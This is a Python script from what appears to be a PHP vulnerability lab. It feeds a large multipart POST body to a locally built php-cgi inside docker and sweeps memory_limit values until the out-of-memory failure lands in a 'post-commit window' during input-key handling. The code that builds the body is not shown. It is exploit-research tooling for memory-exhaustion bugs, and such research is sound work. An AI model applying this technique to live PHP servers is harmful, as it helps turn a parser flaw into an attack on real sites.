#!/usr/bin/env python3
"""oom29c: fine limit sweep — land the wall ON a key-class ask.
Detector (trace-based, reliable): commits > oks => key died post-commit.
Fatal text lives in o.log (CGI body), trace in e.log.
"""
import re
import subprocess
import sys

sys.argv = ["x", "24M", "4000", "7"]
exec(open("/tmp/phplab/oom29.py").read().replace('if __name__ == "__main__":\n    main()', ''))

body = build()
subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
               input=body, capture_output=True, timeout=120)
print("body", len(body), flush=True)

CMD = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
       "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
       "/usr/src/php-8.2.34/sapi/cgi/php-cgi -d memory_limit=%d -d post_max_size=4096M "
       "-d max_input_vars=100000 </tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")

start = int(sys.argv[4]) if len(sys.argv) > 4 else 23200000
stop = int(sys.argv[5]) if len(sys.argv) > 5 else 24100000
step = int(sys.argv[6]) if len(sys.argv) > 6 else 32768

for limit in range(start, stop, step):
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", CMD % (len(body), limit)],
                       capture_output=True, timeout=300)
    rc = r.stdout.decode().strip()
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/e.log /tmp/o.log"],
                        capture_output=True).stdout.decode("latin1")
    commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+) free=(\d+)", tr)
    oks = len(re.findall(r"TRACE keyok", tr))
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    key_death = len(commits) > oks
    verdict = "KEY-DEATH" if key_death else ("fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive")
    print("limit=%d %s commits=%s oks=%d lastfree=%s tried=%s" %
          (limit, verdict, commits[-1][0] if commits else "-", oks,
           commits[-1][1] if commits else "-", tried[-1] if tried else "-"), flush=True)
    if key_death:
        idx = tr.rfind("TRACE keycommit")
        print("*** KEY DEATH — post-commit window OPEN ***")
        print(tr[idx:idx + 500])
        break
